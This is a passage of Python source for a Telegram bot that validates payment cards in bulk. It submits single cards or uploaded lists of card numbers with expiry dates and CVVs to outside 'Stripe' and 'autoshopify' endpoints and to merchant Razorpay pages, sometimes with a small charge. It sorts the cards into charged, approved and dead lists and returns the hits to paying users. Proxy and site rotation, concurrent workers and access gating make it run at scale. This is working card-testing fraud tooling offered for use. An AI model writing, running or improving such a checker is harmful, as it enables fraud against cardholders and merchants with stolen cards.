    if len(split_card) < 4:
        await event.reply(
            premium_emoji("❌ Invalid card format"),
            parse_mode=html
        )
        return

    status_msg = await event.reply(
        premium_emoji(
            f"<b>⚡💳 #STRIPE CHECKING 💳⚡</b>\n"
            f"<b>💳 Card: <code>{card_display}</code></b>\n"
            f"<b>⚡💠 Checking...</b>"
        ),
        parse_mode=html
    )

    api_url = random.choice(STRIPE_APIS)

    try:

        connector = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=50,
            ssl=False
        )

        async with aiohttp.ClientSession(
            connector=connector
        ) as session:

            async with session.get(
                api_url,
                params={
                    "auth": "WTFH4RSH",
                    "cc": card_display
                },
                timeout=aiohttp.ClientTimeout(total=20)
            ) as response:

                result = await response.json()

                print('Stripe API response:', result)

        message = result.get("status", "UNKNOWN")

        if "CHARGED" in message:
            status_text = "✅ CHARGED"
        
        if "otp_required" in message:
            status_text = "🔐 OTP REQUIRED"

        elif "APPROVED" in message:
            status_text = "🔥 APPROVED"

        else:
            status_text = "❌ DECLINED"

        await status_msg.edit(
            premium_emoji(
                f"<b>⚡💳 #STRIPE 💳⚡</b>\n"
                f"<b>{status_text}</b>\n"
                f"<b>💳 {card_display}</b>\n"
                f"<b>🌐 API: {api_url.split('/')[-1]}</b>\n"
                f"<b>📝 {message}</b>"
            ),
            parse_mode=html
        )

    except Exception as e:

        await status_msg.edit(
            premium_emoji(f"❌ Error: {str(e)}"),
            parse_mode=html
        )



@bot.on(events.NewMessage(pattern=r'^/mst(?:@[\w_]+)?(?:\s|$)'))
async def mstripe(event):

    user_id = event.sender_id

    if not KILLER_ALLOWED_USERS(user_id):
        await event.reply(
            premium_emoji("❌ Needs access from Admin"),
            parse_mode=html
        )
        return

    replied = await event.get_reply_message()

    if not replied:
        await event.reply(
            premium_emoji("❌ Reply to a txt file"),
            parse_mode=html
        )
        return

    file_path = await replied.download_media()

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        cards = [x.strip() for x in f.readlines() if "|" in x]

    if not cards:
        await event.reply(
            premium_emoji("❌ No valid cards found"),
            parse_mode=html
        )
        return

    total = len(cards)

    checked = 0

    charged = []
    approved = []
    declined = []
    errors = []

    session_id = str(random.randint(100000, 999999))

    mass_check_events[session_id] = asyncio.Event()

    stop_event = mass_check_events[session_id]

    charged_file = f"/tmp/{session_id}_charged.txt"
    approved_file = f"/tmp/{session_id}_approved.txt"
    declined_file = f"/tmp/{session_id}_declined.txt"
    errors_file = f"/tmp/{session_id}_errors.txt"

    progress_msg = await event.reply(
        premium_emoji(
            f"<b>⚡ STRIPE MASS CHECK ⚡</b>\n\n"
            f"📦 Total: {total}\n"
            f"✅ Charged: 0\n"
            f"🔥 Approved: 0\n"
            f"❌ Declined: 0\n"
            f"⚠️ Errors: 0\n"
            f"⏳ Checked: 0/{total}"
        ),
        buttons=[
            [
                Button.inline(
                    "✅ Charged (0)",
                    data=f"charged_{session_id}"
                ),
                Button.inline(
                    "🔥 Approved (0)",
                    data=f"approved_{session_id}"
                )
            ],
            [
                Button.inline(
                    "❌ Declined (0)",
                    data=f"declined_{session_id}"
                ),
                Button.inline(
                    "⚠️ Errors (0)",
                    data=f"errors_{session_id}"
                )
            ],
            [
                Button.inline(
                    "🛑 Stop",
                    data=f"stop_{session_id}"
                )
            ]
        ],
        parse_mode=html
    )

    semaphore = asyncio.Semaphore(9)

    async def check_card(session, api_url, card):

        async with semaphore:

            try:

                async with session.get(
                    api_url,
                    params={
                        "auth": "WTFH4RSH",
                        "cc": card
                    },
                    timeout=aiohttp.ClientTimeout(total=40)
                ) as response:

                    raw = await response.text()

                    try:
                        result = await response.json()

                    except:
                        result = {
                            "message": raw
                        }

                message = str(result.get("message", "UNKNOWN"))

                if "CHARGED" in message.upper():

                    status = "CHARGED"

                elif "APPROVED" in message.upper():

                    status = "APPROVED"

                else:

                    status = "DECLINED"

                return {
                    "card": card,
                    "status": status,
                    "message": message,
                    "api": api_url.split("/")[-1]
                }

            except Exception as e:

                return {
                    "card": card,
                    "status": "ERROR",
                    "message": str(e),
                    "api": api_url.split("/")[-1]
                }

    async with aiohttp.ClientSession() as session:

        tasks = []

        for index, card in enumerate(cards):

            api_url = STRIPE_APIS[index % len(STRIPE_APIS)]

            tasks.append(
                check_card(session, api_url, card)
            )

        for future in asyncio.as_completed(tasks):

            if stop_event.is_set():

                await progress_msg.edit(
                    premium_emoji(
                        f"<b>🛑 MASS CHECK STOPPED</b>\n\n"
                        f"📦 Total: {total}\n"
                        f"✅ Charged: {len(charged)}\n"
                        f"🔥 Approved: {len(approved)}\n"
                        f"❌ Declined: {len(declined)}\n"
                        f"⚠️ Errors: {len(errors)}\n"
                        f"⏳ Checked: {checked}/{total}"
                    ),
                    buttons=[
                        [
                            Button.inline(
                                f"✅ Charged ({len(charged)})",
                                data=f"charged_{session_id}"
                            ),
                            Button.inline(
                                f"🔥 Approved ({len(approved)})",
                                data=f"approved_{session_id}"
                            )
                        ],
                        [
                            Button.inline(
                                f"❌ Declined ({len(declined)})",
                                data=f"declined_{session_id}"
                            ),
                            Button.inline(
                                f"⚠️ Errors ({len(errors)})",
                                data=f"errors_{session_id}"
                            )
                        ]
                    ],
                    parse_mode=html
                )

                break

            result = await future

            checked += 1

            card = result["card"]
            status = result["status"]
            message = result["message"]

            if status == "CHARGED":

                charged.append(card)

                with open(charged_file, "a") as f:
                    f.write(card + "\n")

            elif status == "APPROVED":

                approved.append(card)

                with open(approved_file, "a") as f:
                    f.write(card + "\n")

            elif status == "DECLINED":

                declined.append(card)

                with open(declined_file, "a") as f:
                    f.write(card + "\n")

            else:

                errors.append(f"{card} | {message}")

                with open(errors_file, "a") as f:
                    f.write(f"{card} | {message}\n")

            try:

                await progress_msg.edit(
                    premium_emoji(
                        f"<b>⚡ STRIPE MASS CHECK ⚡</b>\n\n"
                        f"📦 Total: {total}\n"
                        f"✅ Charged: {len(charged)}\n"
                        f"🔥 Approved: {len(approved)}\n"
                        f"❌ Declined: {len(declined)}\n"
                        f"⚠️ Errors: {len(errors)}\n"
                        f"⏳ Checked: {checked}/{total}\n\n"
                        f"<b>Last:</b> <code>{card}</code>\n"
                        f"<b>Status:</b> {status}\n"
                        f"<b>API:</b> {result['api']}"
                    ),
                    buttons=[
                        [
                            Button.inline(
                                f"✅ Charged ({len(charged)})",
                                data=f"charged_{session_id}"
                            ),
                            Button.inline(
                                f"🔥 Approved ({len(approved)})",
                                data=f"approved_{session_id}"
                            )
                        ],
                        [
                            Button.inline(
                                f"❌ Declined ({len(declined)})",
                                data=f"declined_{session_id}"
                            ),
                            Button.inline(
                                f"⚠️ Errors ({len(errors)})",
                                data=f"errors_{session_id}"
                            )
                        ],
                        [
                            Button.inline(
                                "🛑 Stop",
                                data=f"stop_{session_id}"
                            )
                        ]
                    ],
                    parse_mode=html
                )

            except Exception as e:

                print(f"Edit Error: {e}")

    if session_id in mass_check_events:
        del mass_check_events[session_id]

    await progress_msg.edit(
        premium_emoji(
            f"<b>⚡ STRIPE MASS CHECK DONE ⚡</b>\n\n"
            f"📦 Total: {total}\n"
            f"✅ Charged: {len(charged)}\n"
            f"🔥 Approved: {len(approved)}\n"
            f"❌ Declined: {len(declined)}\n"
            f"⚠️ Errors: {len(errors)}"
        ),
        buttons=[
            [
                Button.inline(
                    f"✅ Charged ({len(charged)})",
                    data=f"charged_{session_id}"
                ),
                Button.inline(
                    f"🔥 Approved ({len(approved)})",
                    data=f"approved_{session_id}"
                )
            ],
            [
                Button.inline(
                    f"❌ Declined ({len(declined)})",
                    data=f"declined_{session_id}"
                ),
                Button.inline(
                    f"⚠️ Errors ({len(errors)})",
                    data=f"errors_{session_id}"
                )
            ]
        ],
        parse_mode=html
    )

@bot.on(events.CallbackQuery(pattern=r'approved_'))
async def handle_approved_callback(event):

    callback_data = event.data.decode('utf-8')

    session_id = callback_data.replace('approved_', '')

    file_path = f'/tmp/{session_id}_approved.txt'

    try:

        if not os.path.exists(file_path):
            await event.answer("❌ No approved cards")
            return

        await bot.send_file(
            event.sender_id,
            file_path,
            caption="<b>🔥 Approved Cards</b>",
            parse_mode=html
        )

        await event.answer("✅ Sent!")

    except Exception as e:

        await event.answer(f"❌ Error: {str(e)[:50]}")


@bot.on(events.CallbackQuery(pattern=r'declined_'))
async def handle_declined_callback(event):
    """Send declined results to user"""
    callback_data = event.data.decode('utf-8')
    session_id = callback_data.replace('declined_', '')
    file_path = f'/tmp/{session_id}_declined.txt'
    
    try:
        if not os.path.exists(file_path):
            await event.answer("❌ Results file not found")
            return
        
        with open(file_path, 'r') as f:
            content = f.read()
            lines = content.strip().split('\n') if content.strip() else []
        
        if not lines:
            await event.answer("❌ No declined cards found")
            return
        
        # Send as file if > 10 lines, else as direct message
        if len(lines) > 10:
            await bot.send_file(event.sender_id, file_path, caption="<b>❌ Declined Cards</b>", parse_mode=html)
        else:
            msg = "<b>❌ Declined Cards:</b>\n\n"
            for line in lines:
                msg += f"<code>{line}</code>\n"
            await bot.send_message(event.sender_id, msg, parse_mode=html)
        
        await event.answer("✅ Sent!")
    except Exception as e:
        await event.answer(f"❌ Error: {str(e)[:50]}")
        print(f"Error in declined callback: {e}")

@bot.on(events.CallbackQuery(pattern=r'errors_'))
async def handle_errors_callback(event):
    """Send error results to user"""
    callback_data = event.data.decode('utf-8')
    session_id = callback_data.replace('errors_', '')
    file_path = f'/tmp/{session_id}_errors.txt'
    
    try:
        if not os.path.exists(file_path):
            await event.answer("❌ Results file not found")
            return
        
        with open(file_path, 'r') as f:
            content = f.read()
            lines = content.strip().split('\n') if content.strip() else []
        
        if not lines:
            await event.answer("❌ No errors found")
            return
        
        # Send as file if > 10 lines, else as direct message
        if len(lines) > 10:
            await bot.send_file(event.sender_id, file_path, caption="<b>⚠️ Error Cards</b>", parse_mode=html)
        else:
            msg = "<b>⚠️ Error Cards:</b>\n\n"
            for line in lines:
                msg += f"<code>{line}</code>\n"
            await bot.send_message(event.sender_id, msg, parse_mode=html)
        
        await event.answer("✅ Sent!")
    except Exception as e:
        await event.answer(f"❌ Error: {str(e)[:50]}")
        print(f"Error in errors callback: {e}")

@bot.on(events.CallbackQuery(pattern=r'stop_'))
async def handle_stop_callback(event):
    """Stop an active mass check session"""
    callback_data = event.data.decode('utf-8')
    session_id = callback_data.replace('stop_', '')
    
    if session_id not in mass_check_events:
        await event.answer("❌ Session not found or already completed")
        return
    
    # Signal the mass check loop to stop
    mass_check_events[session_id].set()
    await event.answer("🛑 Stopping mass check...")

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    """Check a single proxy"""
    user_id = event.sender_id

    if not KILLER_ALLOWED_USERS(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode=html)
        return

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode=html)
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode=html)

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode=html)
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode=html)

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode=html)




RZ_API = 'https://autoshopify-production-e4f6.up.railway.app'

RZ_SITE = random.choice(['https://razorpay.me/@holidaymoodsadventure', 'https://razorpay.me/@instituteoftechnicalandscient', 'https://razorpay.me/@Advance-BIM', 'https://razorpay.me/@iropay', 'https://razorpay.me/@bafel'])

async def handle_rz_stream(
    event,
    progress_msg,
    cards
):

    payload = {
        "cards": cards,
        "site_url": RZ_SITE,
        "amount": 1,
        "save_results": True
    }

    charged = []
    live = []
    dead = []

    checked = 0

    connector = aiohttp.TCPConnector(
        limit=0,
        ssl=False
    )

    timeout = aiohttp.ClientTimeout(
        total=None
    )

    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout
    ) as session:

        async with session.post(
                f"{RZ_API}/rz/stream",
                json=payload
            ) as resp:

                async for raw_line in resp.content:

                    line = (
                        raw_line
                        .decode()
                        .strip()
                    )

                    if not line.startswith("data: "):
                        continue

                    try:

                        data = json.loads(
                            line[6:]
                        )

                    except:
                        continue

                    event_type = data.get("type")

                    # START
                    if event_type == "start":

                        total = data.get("total")

                    # RESULT
                    elif event_type == "result":

                        checked += 1

                        status = data.get(
                            "status",
                            ""
                        )

                        card = data.get(
                            "card",
                            ""
                        )

                        if status == "CHARGED":

                            charged.append(card)

                        elif status == "LIVE":

                            live.append(card)

                        else:

                            dead.append(card)

                        # THROTTLED UI
                        if (
                            checked % 5 == 0
                            or checked == len(cards)
                        ):

                            try:

                                await progress_msg.edit(
                                    f"""
    ⚡ <b>RZ STREAM</b>

    📦 Total: {len(cards)}
    ⏳ Checked: {checked}

    ✅ Charged: {len(charged)}
    🔥 Live: {len(live)}
    ❌ Dead: {len(dead)}
    """,
                                    parse_mode='html'
                                )

                            except:
                                pass

                    # COMPLETE
                    elif event_type == "complete":

                        await progress_msg.edit(
                            f"""
    ✅ <b>RZ COMPLETE</b>

    📦 Total: {data.get('total')}
    ✅ Charged: {data.get('charged')}
    🔥 Live: {data.get('live')}
    """,
                            parse_mode='html'
                        )

                        break

                    # ERRORS
                    elif event_type in [
                        "fatal",
                        "fatal_error"
                    ]:

                        await progress_msg.edit(
                            f"❌ {data.get('error')}"
                        )

                        break

                
@bot.on(events.NewMessage(pattern=r'^/rz(?:@[\w_]+)?(?:\s|$)'))
async def rz(event):

    try:

        card = (
            event.raw_text
            .split(" ", 1)[1]
            .strip()
        )

    except:

        await event.reply(premium_emoji("❌ Usage: <code>/rz cc|mm|yy|cvv</code>"), parse_mode=html)
        return

    progress = await event.reply(
        "⚡ Starting RZ stream..."
    )

    asyncio.create_task(
        handle_rz_stream(
            event,
            progress,
            [card]
        )
    )




@bot.on(events.NewMessage(pattern=r'^/mrz(?:@[\w_]+)?(?:\s|$)'))
async def mrz(event):

    user_id = event.sender_id

    if not KILLER_ALLOWED_USERS(user_id):

        await event.reply(premium_emoji("❌ Usage: <code>You Dont Have Access</code>"), parse_mode=html)
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Usage: <code>Reply /mrz to a text file</code>"), parse_mode=html)
        return

    reply = await event.get_reply_message()

    path = await reply.download_media()

    with open(path, 'r') as f:
        content = f.read()

    cards = extract_cc(content)

    progress = await event.reply(
        f"⚡ Starting stream for {len(cards)} cards..."
    )

    asyncio.create_task(
        handle_rz_stream(
            event,
            progress,
            cards
        )
    )




@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    """Remove a single proxy from proxy.txt"""
    user_id = event.sender_id

    if not KILLER_ALLOWED_USERS(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode=html)
        return

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode=html)
        return

    current_proxies = load_proxies()

    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode=html)
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode=html)

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    """Remove proxies by index (comma separated)"""
    user_id = event.sender_id

    if not KILLER_ALLOWED_USERS(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode=html)
        return

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode=html)
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode=html)
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode=html)
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode=html)
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode=html)

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    """Remove all proxies from proxy.txt"""
    user_id = event.sender_id

    if not KILLER_ALLOWED_USERS(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode=html)
        return

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty."), parse_mode=html)
        return

    # Send backup file to user
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(
            premium_emoji(
                f"📦 <b>Backup Created!</b>\n\n"
                f"Sending backup of {count} proxies before clearing..."
            ),
            file=backup_filename,
            parse_mode=html
        )

        # Remove backup file after sending
        try:
            os.remove(backup_filename)
        except:
            pass

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode=html)
        return

    # Clear proxy.txt
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode=html)

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    """Get all proxies from proxy.txt"""
    user_id = event.sender_id

    if not KILLER_ALLOWED_USERS(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode=html)
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode=html)
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode=html)
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode=html)

        try:
            os.remove(filename)
        except:
            pass


@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    """Command to add proxies to proxy.txt"""
    user_id = event.sender_id
    if not KILLER_ALLOWED_USERS(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return

    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/addproxy` followed by proxies, one per line."))
            return

        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ No proxies provided."))
            return

        current_proxies = load_proxies()
        new_proxies = []

        for proxy in proxies_to_add:
            if proxy not in current_proxies:
                new_proxies.append(proxy)

        if not new_proxies:
            await event.reply(premium_emoji("⚠️ All provided proxies already exist in `proxy.txt`."))
            return

        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"✅ **Proxies Added Successfully!**\n\nAdded {len(new_proxies)} new proxies to `proxy.txt`."))

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error adding proxies: {e}"))

@bot.on(events.NewMessage(pattern=r'^/rm'))
async def remove_site_command(event):
    """Command to remove a site from sites.txt"""
    user_id = event.sender_id
    if not KILLER_ALLOWED_USERS(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
        return

    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/rm https://site.com`"))
            return

        url_to_remove = args[1].strip()
        current_sites = load_sites()

        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found in list: `{url_to_remove}`"))
            return

        new_sites = [site for site in current_sites if site != url_to_remove]

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f"✅ **Site Removed Successfully!**\n\n`{url_to_remove}` has been deleted from `sites.txt`.\n\n_Active checks will stop using this site in the next batch._"))

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error removing site: {e}"))

@bot.on(events.NewMessage(pattern=r'^/chk(?:@[\w_]+)?(?:\s|$)'))
async def check_command(event):

    """Ultra Fast Mass Checker"""

    user_id = event.sender_id

    try:

        sender = await event.get_sender()

        username = (
            sender.username
            if sender.username
            else f"user_{user_id}"
        )

    except:

        username = f"user_{user_id}"

    if not KILLER_ALLOWED_USERS(user_id):

        await event.reply(
            premium_emoji(
                "😡 <b>Access Denied</b>\n\n"
                "Only premium users can use this bot."
            ),
            parse_mode=html
        )

        return

    if not event.reply_to_msg_id:

        await event.reply(
            premium_emoji(
                "❌ Reply to a txt file."
            ),
            parse_mode=html
        )

        return

    reply_msg = await event.get_reply_message()

    if (
        not reply_msg.file
        or not reply_msg.file.name.endswith('.txt')
    ):

        await event.reply(
            premium_emoji(
                "❌ Reply to a txt file."
            ),
            parse_mode=html
        )

        return

    status_msg = await event.reply(
        premium_emoji(
            "⚡ Processing..."
        ),
        parse_mode=html
    )

    file_path = await reply_msg.download_media()

    async with aiofiles.open(
        file_path,
        'r',
        encoding='utf-8',
        errors='ignore'
    ) as f:

        content = await f.read()

    os.remove(file_path)

    cards = extract_cc(content)

    if not cards:

        await status_msg.edit(
            premium_emoji(
                "❌ No valid cards found."
            ),
            parse_mode=html
        )

        return

    if len(cards) > 5000:

        cards = cards[:5000]

    total_cards = len(cards)

    sites = load_sites()

    proxies = load_proxies()

    if not sites:

        await status_msg.edit(
            premium_emoji(
                "❌ No sites loaded."
            ),
            parse_mode=html
        )

        return

    if not proxies:

        await status_msg.edit(
            premium_emoji(
                "❌ No proxies loaded."
            ),
            parse_mode=html
        )

        return

    # initialize smart pools
    load_site_pool(sites)

    load_proxy_pool(proxies)

    session_key = (
        f"{user_id}_{status_msg.id}"
    )

    active_sessions[session_key] = {
        'paused': False,
        'stopped': False
    }

    charged_file = (
        f"/tmp/{session_key}_charged.txt"
    )

    approved_file = (
        f"/tmp/{session_key}_approved.txt"
    )

    dead_file = (
        f"/tmp/{session_key}_dead.txt"
    )

    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'checked': 0,
        'start_time': time.time()
    }

    progress_msg = await status_msg.edit(
        premium_emoji(
            f"⚡ <b>MASS CHECK STARTED</b>\n\n"
            f"📦 Total: {total_cards}\n"
            f"✅ Charged: 0\n"
            f"🔥 Approved: 0\n"
            f"❌ Dead: 0\n"
            f"⏳ Checked: 0/{total_cards}\n"
            f"⚡ CPM: 0"
        ),
        buttons=[
            [
                Button.inline(
                    "✅ Charged (0)",
                    data=f"charged_{session_key}"
                ),
                Button.inline(
                    "🔥 Approved (0)",
                    data=f"approved_{session_key}"
                )
            ],
            [
                Button.inline(
                    "❌ Dead (0)",
                    data=f"dead_{session_key}"
                )
            ],
            [
                Button.inline(
                    "⏸ Pause",
                    data=f"pause_{session_key}"
                ),
                Button.inline(
                    "🛑 Stop",
                    data=f"stop_{session_key}"
                )
            ]
        ],
        parse_mode=html
    )

    queue = asyncio.Queue()

    for card in cards:

        queue.put_nowait(card)

    ui_lock = asyncio.Lock()

    async def ui_updater():

        last_checked = -1

        while session_key in active_sessions:

            await asyncio.sleep(2)

            checked = (
                all_results['checked']
            )

            if checked == last_checked:
                continue

            last_checked = checked

            elapsed = max(
                time.time()
                - all_results['start_time'],
                1
            )

            cpm = int(
                (checked / elapsed) * 60
            )

            charged_count = len(
                all_results['charged']
            )

            approved_count = len(
                all_results['approved']
            )

            dead_count = len(
                all_results['dead']
            )

            progress_bar_length = 10

            filled = int(
                (checked / total_cards)
                * progress_bar_length
            )

            progress_bar = (
                "█" * filled +
                "░" * (
                    progress_bar_length - filled
                )
            )

            session_state = (
                active_sessions.get(
                    session_key,
                    {}
                )
            )

            try:

                async with ui_lock:

                    await progress_msg.edit(
                        premium_emoji(
                            f"⚡ <b>MASS CHECK RUNNING</b>\n\n"
                            f"<code>{progress_bar}</code>\n\n"
                            f"📦 Total: {total_cards}\n"
                            f"⏳ Checked: {checked}/{total_cards}\n\n"
                            f"✅ Charged: {charged_count}\n"
                            f"🔥 Approved: {approved_count}\n"
                            f"❌ Dead: {dead_count}\n\n"
                            f"⚡ CPM: {cpm}\n"
                            f"🕒 Time: {int(elapsed)}s"
                        ),
                        buttons=[
                            [
                                Button.inline(
                                    f"✅ Charged ({charged_count})",
                                    data=f"charged_{session_key}"
                                ),
                                Button.inline(
                                    f"🔥 Approved ({approved_count})",
                                    data=f"approved_{session_key}"
                                )
                            ],
                            [
                                Button.inline(
                                    f"❌ Dead ({dead_count})",
                                    data=f"dead_{session_key}"
                                )
                            ],
                            [
                                Button.inline(
                                    (
                                        "▶ Resume"
                                        if session_state.get(
                                            'paused'
                                        )
                                        else "⏸ Pause"
                                    ),
                                    data=f"pause_{session_key}"
                                ),
                                Button.inline(
                                    "🛑 Stop",
                                    data=f"stop_{session_key}"
                                )
                            ]
                        ],
                        parse_mode=html
                    )

            except Exception as e:

                print(
                    f"UI Error: {e}"
                )

    async def worker():

        while not queue.empty():

            if session_key not in active_sessions:
                return

            session_state = (
                active_sessions.get(
                    session_key
                )
            )

            if not session_state:
                return

            if session_state.get('stopped'):
                return

            while session_state.get(
                'paused',
                False
            ):

                await asyncio.sleep(0.2)

                if session_key not in active_sessions:
                    return

            batch = []

            for _ in range(BATCH_SIZE):

                if queue.empty():
                    break

                try:

                    batch.append(
                        queue.get_nowait()
                    )

                except asyncio.QueueEmpty:
                    break

            if not batch:
                return

            try:

                results = await asyncio.gather(
                    *[
                        check_card_with_retry(card)
                        for card in batch
                    ]
                )

            except Exception as e:

                print(
                    f"Batch Error: {e}"
                )

                continue

            for res in results:

                card = res['card']

                all_results['checked'] += 1

                if res['status'] == 'Charged':

                    all_results['charged'].append(
                        res
                    )

                    async with aiofiles.open(
                        charged_file,
                        "a"
                    ) as f:

                        await f.write(
                            f"{card}\n"
                        )

                    asyncio.create_task(
                        send_realtime_hit(
                            user_id,
                            res,
                            'Charged',
                            username
                        )
                    )

                elif res['status'] == 'Approved':

                    all_results['approved'].append(
                        res
                    )

                    async with aiofiles.open(
                        approved_file,
                        "a"
                    ) as f:

                        await f.write(
                            f"{card}\n"
                        )

                    asyncio.create_task(
                        send_realtime_hit(
                            user_id,
                            res,
                            'Approved',
                            username
                        )
                    )

                else:

                    all_results['dead'].append(
                        res
                    )

                    async with aiofiles.open(
                        dead_file,
                        "a"
                    ) as f:

                        await f.write(
                            f"{card}\n"
                        )

                queue.task_done()

    try:

        ui_task = asyncio.create_task(
            ui_updater()
        )

        workers = [
            asyncio.create_task(worker())
            for _ in range(WORKERS)
        ]

        await asyncio.gather(*workers)

        ui_task.cancel()

    except Exception as e:

        await bot.send_message(
            user_id,
            premium_emoji(
                f"❌ Error:\n"
                f"<code>{str(e)}</code>"
            ),
            parse_mode=html
        )

    finally:

        if session_key in active_sessions:

            del active_sessions[
                session_key
            ]

        elapsed = max(
            time.time()
            - all_results['start_time'],
            1
        )

        cpm = int(
            (
                all_results['checked']
                / elapsed
            ) * 60
        )

        await progress_msg.edit(
            premium_emoji(
                f"✅ <b>MASS CHECK COMPLETE</b>\n\n"
                f"📦 Total: {total_cards}\n"
                f"⏳ Checked: {all_results['checked']}/{total_cards}\n\n"
                f"✅ Charged: {len(all_results['charged'])}\n"
                f"🔥 Approved: {len(all_results['approved'])}\n"
                f"❌ Dead: {len(all_results['dead'])}\n\n"
                f"⚡ Final CPM: {cpm}"
            ),
            buttons=[
                [
                    Button.inline(
                        f"✅ Charged ({len(all_results['charged'])})",
                        data=f"charged_{session_key}"
                    ),
                    Button.inline(
                        f"🔥 Approved ({len(all_results['approved'])})",
                        data=f"approved_{session_key}"
                    )
                ],
                [
                    Button.inline(
                        f"❌ Dead ({len(all_results['dead'])})",
                        data=f"dead_{session_key}"
                    )
                ]
            ],
            parse_mode=html
        )

@bot.on(events.NewMessage(pattern=r'^/proxy(?:@[\w_]+)?(?:\s|$)'))
async def proxy_command(event):
    """Check proxies concurrently and keep only alive ones"""

    user_id = event.sender_id

